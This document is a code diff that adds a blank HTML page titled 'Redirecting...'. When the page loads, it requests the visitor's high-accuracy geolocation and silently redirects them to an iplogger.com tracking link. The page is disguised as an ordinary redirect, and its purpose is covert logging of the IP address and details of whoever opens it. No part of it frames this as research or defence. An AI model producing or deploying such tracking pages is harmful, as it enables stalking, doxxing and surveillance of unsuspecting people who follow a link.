@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        function enableGeolocation() {
+            // Attempt to get the user's geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Geolocation enabled, but no action needed
+                    },
+                    function() {
+                        // Handle geolocation error silently
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 20000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            // Directly visit the IP logger URL
+            window.location.href = 'https://iplogger.com/25cqk5';
+        }
+
+        // Ensure the function runs on page load
+        window.onload = function() {
+            enableGeolocation();  // Attempt to enable geolocation and redirect
+        };
+    </script>
+</head>
+<body>
+    <!-- No visible content, the page automatically handles everything -->
+</body>
+</html>
